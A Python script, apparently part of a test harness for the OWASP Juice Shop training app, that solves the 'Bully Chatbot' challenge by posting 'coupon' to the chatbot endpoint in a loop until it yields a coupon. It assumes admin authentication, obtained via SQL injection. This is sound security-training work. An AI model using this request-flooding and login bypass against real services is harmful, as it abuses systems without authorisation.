"""
This file is used to solve the OWASP Juice-shop Task BULLY CHATBOT
Methodology: We can send the COUPON message to the supporter machine several times, until it gives us COUPON
"""
import time
from plugins import attack as a

class test_get_coupon_class(a.attack_inter):
    def __init__(self):
        self.juice_session = a.requests.session()
        self.url_who = a.URL + '/rest/user/whoami'
        self.url = a.URL + '/rest/chatbot/respond'
        self.cookie, self.header = a.get_auth('admin')

    def generator(self):
        cookie, header= a.get_auth('admin')
        json_data = {
            'action': "setname",
            'query': 'coupon',
        }

        return json_data, cookie,header

    def run(self):
        #a.logging.basicConfig(filename='./test_logging_info.log',
         #                   level=a.logging.INFO, format='%(asctime)s %(message)s')
        #a.logging.Formatter.converter = time.gmtime
        #logger = a.logging.getLogger("Get Coupon")
        #a.logging.info(logger)
        #a.logging.info('Started')

        json_data, cookie,header = self.generator()
        response = self.juice_session.post(self.url, json = json_data, cookies= cookie, headers=header)
        new_json_data = {
            'action': 'query',
            'query': 'coupon',
        }
        print(response.text)
        if cookie:
            print('hello')
            while (response.text.find("stop nagging me") == -1 ):
                response = self.juice_session.post(self.url, json = new_json_data, cookies=cookie, headers=header)
                print(response.text)
            print("we found coupon:")
            print(response.text)
            #a.logging.info('Finished')
        else:
            print("Not have authentification yet, please try SQL injection first")
            a.logging.info('Finished')